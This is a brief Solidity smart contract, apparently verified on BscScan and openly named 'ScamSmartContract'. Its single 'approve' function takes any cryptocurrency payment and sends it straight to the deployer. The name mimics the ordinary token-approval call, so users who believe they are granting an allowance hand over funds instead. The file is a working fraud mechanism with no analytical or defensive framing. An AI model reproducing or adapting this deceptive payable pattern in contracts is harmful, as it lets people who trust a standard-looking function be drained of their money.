/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

pragma solidity ^0.5.0;

contract ScamSmartContract {
    address payable public beneficiary;

    constructor() public {
        beneficiary = msg.sender;
    }

    function approve() public payable {
        require(msg.value > 0);
        beneficiary.transfer(msg.value);
    }
}